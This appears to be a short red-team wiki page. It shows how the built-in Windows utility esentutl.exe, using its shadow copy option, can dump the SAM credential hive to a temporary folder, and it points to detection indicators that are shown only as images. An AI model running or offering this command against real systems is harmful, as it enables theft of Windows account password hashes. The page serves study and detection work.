# Dumping SAM via esentutl.exe

## Execution

It's possible to use esentutl.exe that comes with Windows and dump SAM/Security hives like so:

```text
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
```

![](../../.gitbook/assets/image%20%28674%29.png)

## Observation

The below are some potential IOCs for detecting this technique:

![](../../.gitbook/assets/image%20%28659%29.png)

## References

{% embed url="https://superuser.com/questions/364290/how-to-dump-the-windows-sam-file-while-the-system-is-running" %}

